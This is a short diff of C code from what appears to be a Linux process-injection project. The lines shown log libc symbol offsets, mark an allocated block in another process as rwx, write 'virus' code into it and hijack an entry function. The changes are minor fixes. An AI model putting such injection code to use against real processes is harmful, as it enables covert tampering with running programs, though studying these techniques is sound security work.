@@ -27,7 +27,7 @@ static void restore_process_state(pstate_t const * pstate);
 static void replace_entry_function(pid_t pid, intptr_t entry_function, intptr_t virus_address);
 static void detach_process(pstate_t const * pstate);
 
-
+__attribute__ ((no_sanitize("address", "undefined")))
 int virus(int argument);
 
 
@@ -86,7 +86,7 @@ static void inspect_libc(char const binary_path[const], intptr_t function_offset
 
     function_offset[MPROTECT] = get_symbol_offset_in_binary(libc_path, "mprotect", true);
     check_for_error();
-    INFO("mprotect found at %#lx in libc", function_offset[POSIX_MEMALIGN]);
+    INFO("mprotect found at %#lx in libc", function_offset[MPROTECT]);
 
     function_offset[FREE] = get_symbol_offset_in_binary(libc_path, "free", true);
     check_for_error();
@@ -162,7 +162,7 @@ static intptr_t inject_virus(pstate_t * const pstate, intptr_t const function_ad
     check_for_error();
     INFO("Set new permissions on the allocated block (rwx)");
 
-    inject_raw_code_to_process(pstate->pid, block_address, code_size, code);
+    proc_write_block(pstate->pid, block_address, code_size, code);
     check_for_error();
     INFO("Virus code successfully injected in the allocated memory\n");
 
